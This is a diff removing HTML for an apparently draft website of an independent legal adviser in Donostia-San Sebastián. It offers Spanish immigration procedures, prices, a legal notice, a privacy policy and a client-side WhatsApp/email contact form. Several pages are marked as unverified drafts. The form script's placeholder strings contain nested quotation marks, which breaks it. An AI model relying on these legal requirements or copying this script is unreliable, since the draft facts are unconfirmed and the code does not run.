-          <p class="tenue">Alcance completo en el <a href="#aviso-legal">aviso legal</a>.</p>
-        </div>
-
-        <h2>Dónde estamos</h2>
-        <p>Donostia-San Sebastián, para toda Gipuzkoa. La tramitación es telemática y no necesita desplazarse: si prefiere vernos en persona, se concierta cita.</p>
-
-      </div>
-
-      <aside class="columna-lateral" aria-label="Contacto">
-        <div class="ficha-precio">
-          <span class="etiqueta">Hablemos</span>
-          <p class="plazo-suelto">Cuéntenos su situación en una frase. Le decimos si encaja en
-             alguna figura y cuál.</p>
-          <div class="acciones">
-            <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">Escribir por WhatsApp</a>
-            <a class="boton" href="#contacto">Pedir que le llamemos</a>
-          </div>
-          <p class="tenue">La primera respuesta no se cobra. La consulta completa son 45 €, que
-             se descuentan del precio del trámite si lo encarga.</p>
-        </div>
-      </aside>
-    </div>
-
-  </div>
-</section>
-<section class="pagina" id="arraigo-segunda-oportunidad" hidden>
-  <div class="envoltura">
-    <span class="chip-borrador">Borrador · sin verificar</span>
-<!-- Plantilla de pagina de servicio. Una figura por pagina, misma estructura interna en
-     todas: es lo que posiciona y lo que hace comparable el servicio. El orden de los
-     bloques no se altera sin decision del Director.
-
-     En escritorio se parte en dos columnas: el contenido a la izquierda y, a la derecha,
-     una barra fija con el precio y las llamadas a la accion. En movil vuelve a ser una
-     sola columna y el precio recupera su sitio, despues de "que incluye y que no". -->
-
-    <p class="antetitulo">Arraigo</p>
-    <h1>Arraigo de segunda oportunidad en Donostia-San Sebastián</h1>
-    <p class="entradilla">Si tuvo papeles en los últimos dos años y los perdió porque no pudo renovar, esta figura se creó para usted. Preparamos y presentamos el expediente completo, con precio cerrado desde el primer día.</p>
-
-    <div class="dos-columnas">
-      <div class="columna-principal">
-
-        <h2>Qué es y a quién sirve</h2>
-    <p>El arraigo de segunda oportunidad es una figura nueva del reglamento de extranjería vigente. Está pensada para una situación concreta: usted tuvo una autorización de residencia, no pudo renovarla, y quedó en situación irregular.</p>
-    <p>No cubre a quien lleva muchos años sin documentación: la norma mira hacia atrás dos años y no más. Si su última autorización caducó antes de esa ventana, esta no es su vía.</p>
-    <p>Es, eso sí, la figura más limpia de preparar, porque usted ya tuvo un expediente y esa huella administrativa juega a su favor.</p>
-
-        <div class="destacado">
-          <p>Si su tarjeta anterior fue un arraigo, esta vía no le sirve. Es el filtro que más casos descarta y casi nadie lo comprueba antes de cobrar.</p>
-          <p class="fuente">Requisitos específicos del arraigo de segunda oportunidad</p>
-        </div>
-
-        <h2>Requisitos</h2>
-        <ul class="lista">
-      <li>Haber sido titular de una autorización de residencia en los dos años inmediatamente anteriores a la solicitud.</li>
-      <li>Que esa autorización <strong>no</strong> se hubiera concedido por circunstancias excepcionales. Este es el filtro que más casos descarta.</li>
-      <li>Que la renovación no se produjera por motivos distintos al orden público, la seguridad o la salud pública. También se puede solicitar si hubo sentencia denegatoria, sobreseimiento o absolución.</li>
-      <li>Encontrarse en España y no ser solicitante de protección internacional, ni durante la solicitud ni mientras se tramita.</li>
-      <li>Haber permanecido en España de forma continuada durante al menos los dos años anteriores a la solicitud.</li>
-      <li>Carecer de antecedentes penales en España y en los países donde haya residido los cinco años anteriores a su entrada.</li>
-      <li>No tener ya una autorización de estancia o residencia, ni tener en marcha una solicitud de concesión, prórroga, renovación o modificación de otra.</li>
-      <li>No representar una amenaza para el orden público, la seguridad o la salud pública, y haber abonado la tasa.</li>
-        </ul>
-
-        <div class="cta-intermedio">
-          <p>¿No sabe si cumple? Mándenos su situación en una frase y se lo decimos.
-             Esa respuesta no se cobra.</p>
-          <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">Comprobar si mi caso encaja</a>
-        </div>
-
-        <h2>Documentación necesaria</h2>
-        <ul class="lista">
-      <li>Tarjeta o resolución de la autorización anterior, y la resolución de denegación de renovación si la hubo.</li>
-      <li>Pasaporte completo y en vigor, con todas las páginas.</li>
-      <li>Certificado de empadronamiento y prueba de su permanencia continuada en España.</li>
-      <li>Certificado de antecedentes penales del país o países donde haya vivido los últimos cinco años, traducido y legalizado si procede.</li>
-      <li>Justificante del pago de la tasa.</li>
-        </ul>
-
-        <h2>Qué incluye el servicio y qué no</h2>
-        <ul class="si-no">
-      <li class="si">Revisión previa de su caso para confirmar si encaja en esta figura antes de que usted pague nada.</li>
-      <li class="si">Preparación del expediente completo y revisión de cada documento antes de presentarlo.</li>
-      <li class="si">Presentación telemática y seguimiento del estado del expediente.</li>
-      <li class="si">Control de plazos: le avisamos de cada fecha que le afecte, sin que tenga que recordarla usted.</li>
-      <li class="si">Respuesta a los requerimientos de subsanación que le lleguen durante la tramitación.</li>
-      <li class="si">La documentación se envía por correo electrónico, no por WhatsApp: no queda suelta en un chat y hay constancia de qué se entregó y cuándo.</li>
-      <li class="no">No incluye representación ni defensa procesal ante juzgados o tribunales.</li>
-      <li class="no">Tasas administrativas, traducciones juradas y legalizaciones: se pagan aparte y se le dice el importe antes.</li>
-      <li class="no">Ninguna garantía de resolución favorable. La decisión es de la Administración, no nuestra.</li>
-        </ul>
-
-        <div class="limite">
-          <p>Este servicio consiste en asesoramiento y tramitación en vía administrativa, no
-             incluye representación ni defensa procesal. Si su asunto pasa a vía judicial, se le
-             informa y se le propone la derivación a un profesional colegiado.</p>
-          <p class="tenue">Alcance completo en el <a href="#aviso-legal">aviso legal</a>.</p>
-        </div>
-
-        <h2>Preguntas frecuentes</h2>
-    <details>
-      <summary>Llevo más de dos años sin autorización. ¿Me sirve?</summary>
-      <p>No. Esta figura solo alcanza a quien fue titular de una autorización dentro de los dos años anteriores a la solicitud. Si su caso es más antiguo, hay otras vías de arraigo y se lo indicamos.</p>
-    </details>
-    <details>
-      <summary>Mi tarjeta anterior era un arraigo social. ¿Puedo pedir esta?</summary>
-      <p>No. La norma exige que la autorización anterior no hubiera sido concedida por circunstancias excepcionales, y los arraigos lo son. Es la confusión más frecuente con esta figura. En su caso habría que mirar una renovación o una modificación, no una segunda oportunidad.</p>
-    </details>
-    <details>
-      <summary>¿Me representa ante los tribunales si me deniegan?</summary>
-      <p>No. El servicio consiste en asesoramiento y tramitación en vía administrativa, no representación ni defensa procesal. Frente a una denegación se puede plantear recurso en vía administrativa, que sí entra en nuestro trabajo. Si el asunto pasa a vía judicial, se le informa y se le propone la derivación a un profesional colegiado.</p>
-    </details>
-    <details>
-      <summary>¿Cuánto tarda en resolverse?</summary>
-      <p>Lo marca la Administración y no se puede comprometer una fecha. Lo que sí comprometemos es lo nuestro: el expediente queda listo para presentar en el plazo indicado arriba desde que tenemos toda su documentación.</p>
-    </details>
-    <details>
-      <summary>¿Puedo presentarlo yo mismo?</summary>
-      <p>Sí, y en algunos casos le compensará. Lo que compra aquí es que el expediente vaya completo a la primera y que nadie pierda un plazo. En extranjería un plazo perdido es el riesgo material principal, muy por encima del coste del trámite.</p>
-    </details>
-    <details>
-      <summary>¿Hay que ir presencialmente?</summary>
-      <p>No hace falta. Todo el trámite se puede hacer a distancia. Si prefiere vernos en persona, se concierta cita en Donostia.</p>
-    </details>
-
-        <h2>Siguiente paso</h2>
-        <p>Escríbanos con dos datos: qué tipo de tarjeta tuvo y cuándo caducó. Con eso basta para decirle si esta figura le sirve.</p>
-
-      </div>
-
-      <aside class="columna-lateral" aria-label="Precio y contacto">
-        <div class="ficha-precio">
-          <span class="etiqueta">Precio cerrado</span>
-          <div class="precio">
-            <strong>425 €</strong>
-          </div>
-          <p class="plazo-suelto">Expediente listo en 15 días hábiles desde que recibimos toda la
-             documentación.</p>
-          <div class="acciones">
-            <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">Escribir por WhatsApp</a>
-            <a class="boton" href="#contacto">Pedir que le llamemos</a>
-          </div>
-          <p class="tenue">Precio cerrado. No hay suplementos por llamadas, correos ni revisiones. Las tasas administrativas y las traducciones juradas van aparte y se le indican antes de encargarlas. El plazo es el nuestro de preparación: el de resolución lo marca la Administración y nadie puede comprometerlo.</p>
-        </div>
-      </aside>
-    </div>
-
-  </div>
-</section>
-<section class="pagina" id="aviso-legal" hidden>
-  <div class="envoltura">
-    <span class="chip-borrador">Borrador · sin verificar</span>
-    <h1>Aviso legal</h1>
-
-    <p class="entradilla">El acceso y la utilización de este sitio implican la aceptación de
-       las condiciones que siguen. Si no está de acuerdo con ellas, no lo utilice.</p>
-
-    <h2>1. Identificación del titular</h2>
-    <ul class="lista">
-      <li>Titular: Carlos Esteban Vinasco Rojas</li>
-      <li>NIF: Z1201334A</li>
-      <li>Domicilio a efectos de notificaciones: Calle Peñaflorida 8, Donostia-San Sebastián (Gipuzkoa)</li>
-      <li>Teléfono: <span class="pendiente">WHATSAPP_VISIBLE pendiente</span></li>
-      <li>Correo electrónico: <span class="pendiente">EMAIL pendiente</span></li>
-      <li>Sitio web: <span class="pendiente">DOMINIO pendiente</span></li>
-      <li>Actividad: servicios jurídicos prestados por jurista independiente por cuenta propia.</li>
-    </ul>
-    <p class="tenue">Datos facilitados en cumplimiento del art. 10 de la Ley 34/2002, de
-       servicios de la sociedad de la información y de comercio electrónico.</p>
-
-    <h2>2. Condición profesional del titular</h2>
-    <p>El prestador del servicio ejerce como jurista independiente por cuenta propia. No está
-       incorporado a ningún colegio profesional. Todos los trámites aquí detallados se ofrecen
-       como asesoría jurídica no procesal.</p>
-    <ul class="lista">
-      <li>Título académico: Graduado en Derecho</li>
-      <li>Universidad de expedición: Universidad del País Vasco / Euskal Herriko Unibertsitatea (UPV/EHU)</li>
-      <li>Actúa en calidad de Graduado en Derecho y asesor jurídico, en el ámbito del asesoramiento
-          jurídico y de la tramitación en vía administrativa.</li>
-    </ul>
-    <p class="tenue">Datos de titulación facilitados conforme al art. 10.1.c) de la Ley 34/2002,
-       aplicable a las profesiones para cuyo ejercicio se requiere titulación oficial.</p>
-
-    <h2>3. Alcance del servicio</h2>
-    <p>Los servicios ofrecidos consisten en asesoramiento jurídico y en la preparación,
-       presentación y seguimiento de expedientes ante la Administración, actuando como
-       representante de la persona interesada en el procedimiento administrativo al amparo del
-       art. 5 de la Ley 39/2015, de 1 de octubre, del Procedimiento Administrativo Común de las
-       Administraciones Públicas.</p>
-    <p><strong>El servicio no incluye dirección letrada ni actuación ante juzgados o
-       tribunales.</strong> La dirección y defensa procesal está reservada a profesionales
-       colegiados por el art. 542.1 de la Ley Orgánica del Poder Judicial y por la Ley 34/2006,
-       de 30 de octubre.</p>
-    <p>Cuando un asunto deba continuar en vía judicial, se comunica a la persona interesada y
-       se le propone la derivación a un profesional colegiado, que actuará por su cuenta y bajo
-       su propia responsabilidad. No existe delegación ni cesión de firma de ningún tipo.</p>
-
-    <h2>4. Confidencialidad</h2>
-    <p>Toda la información que reciba el titular se trata de forma confidencial y no se
-       comunica a terceros salvo cuando sea necesario para la propia tramitación del expediente
-       o lo imponga una obligación legal.</p>
-
-    <h2>5. Precios</h2>
-    <p>Los precios publicados en este sitio son <strong>precios finales para el consumidor, con
-       el IVA incluido</strong>, y corresponden únicamente al servicio de preparación,
-       presentación y seguimiento del expediente.</p>
-    <p>No incluyen las <strong>tasas administrativas</strong>, que fija la Administración y
-       abona la persona interesada, ni las traducciones juradas, legalizaciones o apostillas que
-       en su caso resulten necesarias. El importe de esos conceptos se comunica antes de
-       encargarlos.</p>
-
-    <h2>6. Responsabilidad</h2>
-    <p>El titular responde de la correcta prestación del servicio conforme a los arts. 1101 y
-       1902 del Código Civil. No garantiza en ningún caso un resultado favorable: la resolución
-       de un expediente corresponde a la Administración competente.</p>
-
-    <h2>7. Objeto y modificación de estas condiciones</h2>
-    <p>Estas condiciones regulan el acceso y la utilización del sitio. El titular puede
-       modificar su presentación, su configuración y su contenido, así como estas mismas
-       condiciones, publicando los cambios en esta página. El uso del sitio después de una
-       modificación supone su aceptación.</p>
-
-    <h2>8. Propiedad intelectual e industrial</h2>
-    <p>Los textos, la estructura, el diseño, el código y el resto de contenidos de este sitio
-       son titularidad de <span class="pendiente">MARCA pendiente</span> o se utilizan con la licencia correspondiente. Su
-       reproducción, distribución o transformación sin autorización expresa no está permitida.</p>
-    <p>Queda a salvo la cita de fragmentos con fines informativos, siempre que se indique la
-       fuente y el enlace al sitio.</p>
-
-    <h2>9. Enlaces</h2>
-    <p>Este sitio no incorpora enlaces a sitios de terceros salvo los estrictamente necesarios
-       para remitir a la información oficial de la Administración. El titular no responde del
-       contenido de sitios ajenos ni del uso que sus responsables hagan de los datos de quien
-       los visite.</p>
-
-    <h2>10. Contenido del sitio</h2>
-    <p>La información publicada en este sitio es divulgativa y no constituye asesoramiento
-       jurídico para un caso concreto. La normativa de extranjería cambia y su aplicación
-       depende de las circunstancias de cada persona. Ninguna decisión debería tomarse solo con
-       lo que se lee aquí.</p>
-    <p>Los textos, la estructura y el diseño de este sitio son titularidad de <span class="pendiente">MARCA pendiente</span>.</p>
-
-    <h2>11. Legislación aplicable</h2>
-    <p>Este aviso legal se rige por la legislación española. Para cualquier controversia serán
-       competentes los órganos jurisdiccionales que determine la normativa aplicable en materia
-       de consumidores y usuarios.</p>
-
-    <p class="tenue">Última actualización: 2026-09-03</p>
-
-  </div>
-</section>
-<section class="pagina" id="contacto" hidden>
-  <div class="envoltura">
-
-    <h1>Contacto</h1>
-    <p class="entradilla">Cuéntenos su situación en un minuto. Le decimos si encaja en alguna
-       figura y cuál. Esa primera respuesta no se cobra.</p>
-
-    <div class="acciones">
-      <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">Escribir por WhatsApp</a>
-      <a class="boton" href="mailto:{{EMAIL}}">Escribir un correo</a>
-    </div>
-    <p class="tenue">WhatsApp Business: <span class="pendiente">WHATSAPP_VISIBLE pendiente</span> · <span class="pendiente">EMAIL pendiente</span></p>
-
-    <h2>Dónde estamos</h2>
-    <p>Donostia-San Sebastián. La tramitación es telemática y no requiere desplazarse; si prefiere una
-       consulta presencial, se concierta sala y cita previa en el centro de la ciudad.</p>
-
-    <h2>Formulario</h2>
-
-    <div class="limite">
-      <p><strong>Este formulario no envía nada a ningún servidor.</strong> Ordena lo que usted
-         escribe y lo abre en su WhatsApp o en su correo para que lo envíe usted mismo. Sus
-         datos no pasan por esta web ni por ninguna empresa intermedia.</p>
-      <p class="tenue">Sirve para que la primera respuesta sea útil en lugar de una ronda de
-         preguntas. Si prefiere no rellenarlo, escriba directamente por cualquiera de los dos
-         botones de arriba.</p>
-    </div>
-
-    <noscript>
-      <p class="tenue"><strong>Su navegador tiene el guion desactivado</strong>, así que el
-         formulario no puede componer el mensaje. Use los botones de arriba: funcionan igual y
-         le atendemos exactamente igual.</p>
-    </noscript>
-
-    <form class="contacto" id="consulta" novalidate>
-
-      <p>
-        <label for="nombre">Su nombre</label>
-        <input type="text" id="nombre" name="nombre" autocomplete="given-name">
-      </p>
-
-      <p>
-        <label for="tramite">¿Qué trámite necesita?
-          <span class="ayuda">Si no lo sabe, déjelo como está: averiguarlo es parte de nuestro trabajo.</span>
-        </label>
-        <select id="tramite" name="tramite">
-          <option value="">Todavía no lo sé</option>
-          <option value="consulta">Solo quiero una consulta</option>
-          <option value="prorroga-regularizacion-2026">Prórroga o modificación de la regularización de 2026</option>
-          <option value="arraigo-segunda-oportunidad">Arraigo de segunda oportunidad</option>
-          <option value="Otro">Otro</option>
-        </select>
-      </p>
-
-      <p>
-        <label for="situacion">¿Cuál es su situación ahora mismo?
-          <span class="ayuda">Opcional. Es lo que más ayuda a decirle rápido si tiene una vía.</span>
-        </label>
-        <select id="situacion" name="situacion">
-          <option value="">Prefiero explicarlo hablando</option>
-          <option>Tengo autorización en vigor</option>
-          <option>Mi autorización caducó hace menos de dos años</option>
-          <option>Mi autorización caducó hace más de dos años</option>
-          <option>Nunca he tenido autorización</option>
-          <option>Estoy con visado o en estancia</option>
-          <option>Soy familiar de una persona española o de la Unión Europea</option>
-        </select>
-      </p>
-
-      <p>
-        <label for="tiempo">¿Cuánto tiempo lleva en España?
-          <span class="ayuda">Opcional. Muchas figuras dependen de esto y de nada más.</span>
-        </label>
-        <select id="tiempo" name="tiempo">
-          <option value="">Prefiero no decirlo ahora</option>
-          <option>Menos de un año</option>
-          <option>Entre uno y dos años</option>
-          <option>Entre dos y tres años</option>
-          <option>Más de tres años</option>
-          <option>No estoy en España</option>
-        </select>
-      </p>
-
-      <p>
-        <label for="contacto">Su teléfono o su correo
-          <span class="ayuda">Solo uno, el que prefiera que usemos.</span>
-        </label>
-        <input type="text" id="contacto" name="contacto" autocomplete="tel">
-      </p>
-
-      <fieldset style="border:0;padding:0;margin:0 0 1rem">
-        <legend style="font-weight:600;font-size:.95rem;padding:0;margin-bottom:.5rem">¿Por dónde lo envía?</legend>
-        <p class="consentimiento" style="margin-bottom:.5rem">
-          <input type="radio" id="via-wa" name="via" value="whatsapp" checked>
-          <label for="via-wa">WhatsApp</label>
-        </p>
-        <p class="consentimiento" style="margin-bottom:0">
-          <input type="radio" id="via-correo" name="via" value="correo">
-          <label for="via-correo">Correo electrónico</label>
-        </p>
-      </fieldset>
-
-      <p class="trampa" aria-hidden="true">
-        <label for="ciudad">Deje este campo vacío</label>
-        <input type="text" id="ciudad" name="ciudad" tabindex="-1" autocomplete="off">
-      </p>
-
-      <p class="consentimiento">
-        <input type="checkbox" id="consentimiento" name="consentimiento" value="si">
-        <label for="consentimiento">He leído la <a href="#privacidad">política de
-          privacidad</a> y acepto que se traten mis datos para responder a esta consulta.</label>
-      </p>
-
-      <p><button class="boton principal" type="submit">Preparar mi mensaje</button></p>
-
-      <p id="aviso-formulario" role="status" aria-live="polite" class="tenue"></p>
-    </form>
-
-    <p class="tenue">No pedimos documentos ni el historial de su caso por aquí. Cuando llegue
-       el momento de reunir la documentación, se envía <strong>por correo electrónico</strong>:
-       WhatsApp es para hablar, no para mandar pasaportes ni certificados de antecedentes.</p>
-
-    <h2>Horario</h2>
-    <p>Puede escribir a cualquier hora, cualquier día. Le respondemos en cuanto lo vemos.</p>
-    <p><strong>Citas:</strong> de lunes a jueves de 12:00 a 13:00, y viernes de 14:00 a 21:00.</p>
-
-<script>
-/* Compone el mensaje y lo abre en WhatsApp o en el correo del propio visitante.
-   No hay envío a ningún servidor: la web no recibe ni almacena nada. El esquema de
-   campos es el definitivo; si algún día el mensaje pasa a un endpoint europeo, se
-   cambia solo el destino de estas dos líneas. */
-(function () {
-  "use strict";
-  var form = document.getElementById("consulta");
-  if (!form) { return; }
-  var aviso = document.getElementById("aviso-formulario");
-
-  var WHATSAPP = "<span class="pendiente">WHATSAPP_E164 pendiente</span>";
-  var CORREO = "<span class="pendiente">EMAIL pendiente</span>";
-
-  function valor(id) {
-    var el = document.getElementById(id);
-    return el ? el.value.trim() : "";
-  }
-
-  function componer() {
-    var lineas = ["Consulta desde la web", ""];
-    var campos = [
-      ["Nombre", valor("nombre")],
-      ["Trámite", valor("tramite")],
-      ["Situación", valor("situacion")],
-      ["Tiempo en España", valor("tiempo")],
-      ["Contacto", valor("contacto")]
-    ];
-    for (var i = 0; i < campos.length; i++) {
-      if (campos[i][1]) { lineas.push(campos[i][0] + ": " + campos[i][1]); }
-    }
-    return lineas.join("\n");
-  }
-
-  form.addEventListener("submit", function (evento) {
-    evento.preventDefault();
-
-    if (valor("ciudad")) { return; }
-
-    if (!valor("nombre") || !valor("contacto")) {
-      aviso.textContent = "Falta su nombre o su forma de contacto. Sin eso no podemos responderle.";
-      (valor("nombre") ? document.getElementById("contacto") : document.getElementById("nombre")).focus();
-      return;
-    }
-    if (!document.getElementById("consentimiento").checked) {
-      aviso.textContent = "Marque la casilla de la política de privacidad para continuar.";
-      document.getElementById("consentimiento").focus();
-      return;
-    }
-
-    try { localStorage.setItem("contacto-iniciado", "1"); } catch (e) {}
-
-    var mensaje = componer();
-    var via = document.querySelector('input[name="via"]:checked');
-    var destino;
-
-    if (via && via.value === "correo") {
-      destino = "mailto:" + CORREO +
-                "?subject=" + encodeURIComponent("Consulta desde la web") +
-                "&body=" + encodeURIComponent(mensaje);
-      aviso.textContent = "Abriendo su programa de correo con el mensaje preparado. Revíselo y envíelo.";
-    } else {
-      destino = "https://wa.me/" + WHATSAPP + "?text=" + encodeURIComponent(mensaje);
-      aviso.textContent = "Abriendo WhatsApp con el mensaje preparado. Revíselo y envíelo.";
-    }
-
-    window.location.href = destino;
-  });
-})();
-</script>
-
-  </div>
-</section>
-<section class="pagina" id="cookies" hidden>
-  <div class="envoltura">
-    <span class="chip-borrador">Borrador · sin verificar</span>
-    <h1>Política de cookies</h1>
-
-    <h2>Este sitio no utiliza cookies</h2>
-    <p>No hay cookies de análisis, ni de publicidad, ni de redes sociales, ni cookies técnicas
-       propias. Por eso tampoco verá un aviso de consentimiento: no habría nada que consentir.</p>
-
-    <h2>Por qué</h2>
-    <p>El sitio es estático y no carga nada desde servidores de terceros: ni tipografías
-       remotas, ni scripts, ni mapas incrustados, ni botones de redes sociales. Todo lo que su
-       navegador descarga procede de <span class="pendiente">DOMINIO pendiente</span>.</p>
-
-    <h2>Lo único que se registra</h2>
-    <p>El proveedor de alojamiento (statichost.eu) mantiene registros técnicos de acceso —
-       dirección IP, fecha y hora, página solicitada — necesarios para prestar el servicio y
-       para la seguridad del sitio. Actúa como encargado de tratamiento con contrato firmado y
-       servidores en Suecia (Unión Europea).</p>
-    <p>Esos registros los conserva el proveedor durante el tiempo necesario para la seguridad
-       del servicio, conforme a su propia política. No se usan para analizar visitas ni se
-       cruzan con ningún otro dato.</p>
-
-    <h2>Si esto cambia</h2>
-    <p>Si en el futuro se incorporara cualquier herramienta que use cookies, se implantaría
-       antes un aviso de consentimiento previo, y esta página se actualizaría antes de
-       activarla.</p>
-
-    <p class="tenue">Última actualización: 2026-09-03</p>
-
-  </div>
-</section>
-<section class="pagina" id="precios" hidden>
-  <div class="envoltura">
-    <span class="chip-borrador">Borrador · sin verificar</span>
-    <h1>Precios</h1>
-    <p class="entradilla">Precio cerrado por trámite, <strong>IVA incluido</strong>. Las tasas
-       administrativas, las traducciones juradas y las legalizaciones van aparte.</p>
-
-    <div class="tabla-envoltura">
-      <table>
-        <caption class="tenue">Precios de preparación y presentación del expediente en vía
-          administrativa.</caption>
-        <thead>
-          <tr><th scope="col">Trámite</th><th scope="col">Precio</th><th scope="col">Plazo de preparación</th></tr>
-        </thead>
-        <tbody>
-          <tr><th colspan="3" scope="rowgroup">Consulta</th></tr>
-          <tr><td>Consulta y cita previa</td><td class="cifra">55 €</td><td>Cita en 48 h</td></tr>
-          <tr><th colspan="3" scope="rowgroup">Tras la regularización de 2026</th></tr>
-          <tr><td><a href="#prorroga-regularizacion-2026">Prórroga o modificación de la regularización de 2026</a></td><td class="cifra">420 €</td><td>15 días hábiles</td></tr>
-          <tr><th colspan="3" scope="rowgroup">Arraigo</th></tr>
-          <tr><td><a href="#arraigo-segunda-oportunidad">Arraigo de segunda oportunidad</a></td><td class="cifra">425 €</td><td>15 días hábiles</td></tr>
-        </tbody>
-      </table>
-    </div>
-
-    <p class="tenue">Una hora para revisar su caso a fondo, presencial en Donostia o a distancia. Si después inicia el trámite, los 55 € se descuentan del precio total.</p>
-
-    <h2>Qué está incluido en el precio</h2>
-    <ul class="si-no">
-      <li class="si">Revisión previa del caso antes de que usted pague nada.</li>
-      <li class="si">Preparación del expediente y revisión documento a documento.</li>
-      <li class="si">Presentación telemática y seguimiento.</li>
-      <li class="si">Control de plazos y respuesta a requerimientos de subsanación.</li>
-      <li class="si">Todas las llamadas y correos que haga falta durante la tramitación.</li>
-      <li class="no">Tasas administrativas: las fija la Administración y se pagan aparte. Para
-        arraigo y circunstancias excepcionales son <strong>38,28 €</strong>, modelo 790 código
-        052, según la Orden PJC/617/2025. Cada figura tiene la suya y se la decimos antes.</li>
-      <li class="no">Traducciones juradas y legalizaciones: se le indica el importe antes de encargarlas.</li>
-      <li class="no">No incluye representación ni defensa procesal ante juzgados o tribunales.</li>
-    </ul>
-
-    <h2>Formas de pago</h2>
-    <p>Bizum o transferencia bancaria. El pago se hace al encargar el trámite, una vez que ya
-       le hemos confirmado que su caso encaja y le hemos pasado el precio cerrado.</p>
-
-    <div class="limite">
-      <p>El servicio consiste en asesoramiento y tramitación en vía administrativa, no incluye
-         representación ni defensa procesal.</p>
-    </div>
-
-    <div class="acciones">
-      <a class="boton principal" href="https://wa.me/{{WHATSAPP_E164}}?text=Hola%2C%20quiero%20informaci%C3%B3n%20sobre%20un%20tr%C3%A1mite%20de%20extranjer%C3%ADa." rel="noopener">Preguntar por WhatsApp</a>
-      <a class="boton" href="#contacto">Formulario de contacto</a>
-    </div>
-
-  </div>
-</section>
-<section class="pagina" id="privacidad" hidden>
-  <div class="envoltura">
-    <span class="chip-borrador">Borrador · sin verificar</span>
-    <h1>Política de privacidad</h1>
-    <p class="entradilla">Qué datos se tratan, con qué base jurídica, quién más los ve y cómo
-       ejercer sus derechos.</p>
-
-    <h2>1. Responsable del tratamiento</h2>
-    <p><span class="pendiente">MARCA pendiente</span> · <span class="pendiente">EMAIL pendiente</span>. Los datos completos de identificación figuran en el
-       <a href="#aviso-legal">aviso legal</a>.</p>
-
-    <h2>2. Qué datos tratamos</h2>
-    <p><strong>Si usa el formulario:</strong> nada llega a esta web. El formulario no envía
-       datos a ningún servidor: ordena lo que usted escribe y lo abre en su propio WhatsApp o
-       en su propio programa de correo, para que sea usted quien lo envíe y a quien usted
-       decida. Mientras no pulse enviar en su aplicación, la información no ha salido de su
-       dispositivo.</p>
-    <p>Cuando usted lo envía, recibimos: su nombre, un dato de contacto, y —solo si eligió
-       responderlas— el trámite que le interesa, su situación administrativa a grandes rasgos y
-       cuánto tiempo lleva en España. Esas tres últimas son opcionales y están ahí para que la
-       primera respuesta sea útil. El formulario no pide documentos ni el historial del caso.</p>
-    <p><strong>Si usa WhatsApp:</strong> su número de teléfono y el contenido de los mensajes
-       que usted decida enviar.</p>
-    <p><strong>Si contrata el servicio:</strong> los datos identificativos y documentales
-       necesarios para preparar y presentar el expediente, incluida su situación
-       administrativa en España.</p>
-
-    <h2>3. Datos de situación administrativa</h2>
-    <p>La información sobre su situación de residencia recibe el tratamiento reforzado propio
-       de los datos de riesgo alto: acceso restringido al titular, no se comparte con terceros
-       ajenos a la tramitación y no se usa para ninguna finalidad publicitaria.</p>
-    <p>Por eso <strong>no publicamos testimonios de clientes</strong> en esta materia, ni
-       siquiera con iniciales o de forma anonimizada: un testimonio de extranjería revela la
-       situación administrativa de quien lo firma.</p>
-    <p class="tenue">La situación administrativa no figura entre las categorías especiales que
-       enumera el art. 9 del RGPD, pero se trata con las mismas cautelas por decisión propia.
-       Este tratamiento no reúne los supuestos del art. 35 que obligarían a una evaluación de
-       impacto: no hay tratamiento a gran escala, ni elaboración de perfiles, ni observación
-       sistemática, ni decisiones automatizadas.</p>
-
-    <h2>4. Para qué y con qué base</h2>
-    <div class="tabla-envoltura">
-      <table>
-        <thead>
-          <tr><th scope="col">Finalidad</th><th scope="col">Base jurídica</th><th scope="col">Conservación</th></tr>
-        </thead>
-        <tbody>
-          <tr>
-            <td>Responder a su consulta</td>
-            <td>Su consentimiento y las medidas precontractuales que usted solicita (art. 6.1.a y 6.1.b RGPD)</td>
-            <td>Un año desde el último contacto, si no llega a contratar</td>
-          </tr>
-          <tr>
-            <td>Prestar el servicio contratado</td>
-            <td>Ejecución del contrato (art. 6.1.b RGPD)</td>
-            <td>Durante la relación y después el plazo de prescripción de las responsabilidades derivadas</td>
-          </tr>
-          <tr>
-            <td>Obligaciones fiscales y contables</td>
-            <td>Obligación legal (art. 6.1.c RGPD)</td>
-            <td>Los plazos que impone la normativa tributaria</td>
-          </tr>
-        </tbody>
-      </table>
-    </div>
-
-    <h2>5. Quién más ve sus datos</h2>
-    <ul class="lista">
-      <li><strong>Proveedor de alojamiento web:</strong> statichost.eu, con servidores en
-        Suecia (Unión Europea) y contrato de encargado de tratamiento firmado (art. 28 RGPD).</li>
-      <li><strong>La Administración competente</strong>, cuando presentamos su expediente. Es
-        el objeto mismo del servicio.</li>
-      <li><strong>WhatsApp Business (Meta Platforms Ireland Ltd.)</strong>, si usted elige ese
-        canal. Los mensajes pasan por su infraestructura y ello implica transferencias fuera
-        del Espacio Económico Europeo bajo las garantías que Meta declara. Si prefiere evitarlo,
-        use el formulario o el correo electrónico.</li>
-    </ul>
-    <p>No cedemos sus datos a nadie más. No hay publicidad, ni perfilado, ni venta de datos, ni
-       decisiones automatizadas.</p>
-
-    <h2>6. Sus derechos</h2>
-    <p>Puede solicitar acceso, rectificación, supresión, limitación, portabilidad y oposición
-       escribiendo a <span class="pendiente">EMAIL pendiente</span>, acreditando su identidad. También puede retirar en cualquier
-       momento el consentimiento que haya prestado, sin que ello afecte al tratamiento anterior.</p>
-    <p>Si considera que no hemos atendido bien su solicitud, puede reclamar ante la Agencia
-       Española de Protección de Datos (<a href="https://www.aepd.es"
-       rel="noopener">www.aepd.es</a>).</p>
-
-    <h2>7. Seguridad</h2>
-    <p>El sitio se sirve cifrado. La documentación de los expedientes se guarda con acceso
-       restringido, cifrado del dispositivo y copia de seguridad periódica.</p>
-
-    <h2>8. Cookies</h2>
-    <p>Este sitio no utiliza cookies de análisis, publicidad ni redes sociales. El detalle está
